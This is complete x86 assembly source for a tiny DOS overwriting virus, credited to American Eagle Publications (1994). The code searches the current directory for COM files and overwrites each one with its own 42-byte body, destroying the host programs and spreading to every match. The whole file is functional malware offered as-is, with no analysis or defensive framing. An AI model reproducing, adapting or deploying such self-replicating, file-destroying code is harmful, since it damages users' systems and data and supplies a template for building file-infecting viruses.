;44 byte virus, overwrites all the COM files in the current directory.
;
;(C) 1994 American Eagle Publications,  Inc.

.model  small

.code


FNAME   EQU     9EH                     ;search-function file name result

        ORG     100H

START:
        mov     ah,4EH                  ;search for *.COM (search first)
        mov     dx,OFFSET COM_FILE
        int     21H

SEARCH_LP:
        jc      DONE
        mov     ax,3D01H                ;open file we found
        mov     dx,FNAME
        int     21H

        xchg    ax,bx                   ;write virus to file
        mov     ah,40H
        mov     cl,42                   ;size of this virus
        mov     dx,100H                 ;location of this virus
        int     21H

        mov     ah,3EH
        int     21H                     ;close file

        mov     ah,4FH
        int     21H                     ;search for next file
        jmp     SEARCH_LP
DONE:
        ret                             ;exit to DOS

COM_FILE        DB      '*.COM',0       ;string for COM file search

        END     START
